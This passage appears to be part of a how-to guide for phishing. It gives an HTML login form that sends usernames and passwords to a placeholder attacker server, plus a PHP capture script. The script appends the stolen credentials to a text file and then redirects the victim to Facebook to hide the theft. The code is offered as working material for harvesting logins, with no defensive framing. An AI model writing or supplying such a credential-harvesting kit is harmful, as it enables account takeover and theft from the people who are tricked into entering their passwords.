```html
<form action="https://your-server.com/capture.php" method="post">
  <input type="text" name="username" placeholder="Username" required>
  <input type="password" name="password" placeholder="Password" required>
  <button type="submit">Log In</button>
</form>
```

In this example, the `action` attribute of the form is set to "https://your-server.com/capture.php", which means that when the user submits the form, the login credentials will be sent to that URL.

Now, you'll need to create the `capture.php` file on your server to handle the incoming credentials. Here's a simple example of how to do that in PHP:

```php
<?php
  $username = $_POST['username'];
  $password = $_POST['password'];

  // Save the credentials to a file
  $file = fopen("credentials.txt", "a");
  fwrite($file, "Username: " . $username . "\n");
  fwrite($file, "Password: " . $password . "\n");
  fclose($file);

  // Redirect the user to the legitimate website
  header("Location: https://www.facebook.com");
?>
```
